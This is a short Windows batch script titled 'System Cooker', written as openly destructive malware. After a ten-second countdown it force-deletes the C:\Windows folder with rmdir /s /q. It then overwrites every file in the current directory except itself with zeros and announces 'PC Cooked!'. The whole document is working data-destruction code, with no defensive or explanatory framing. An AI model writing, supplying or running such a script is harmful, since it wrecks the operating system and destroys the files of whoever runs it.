@echo off
title System Cooker
color 0c

echo Starting PC Cooker...
echo Waiting 10 seconds before destruction...
echo.

:: Wait 10 seconds
timeout /t 10 /nobreak >nul

:: 1. Forcefully delete the Windows folder
echo Deleting C:\Windows...
rmdir /s /q C:\Windows

:: 2. Corrupt all files in the current directory
echo Corrupting files in %cd%...
for %%f in (*) do (
    if not "%%f"=="%~n0.bat" (
        echo 00000000000000000000000000000000 > "%%f"
    )
)

:: Optional: Show a final message
echo.
echo PC Cooked! Windows folder deleted and files corrupted.
echo.
pause
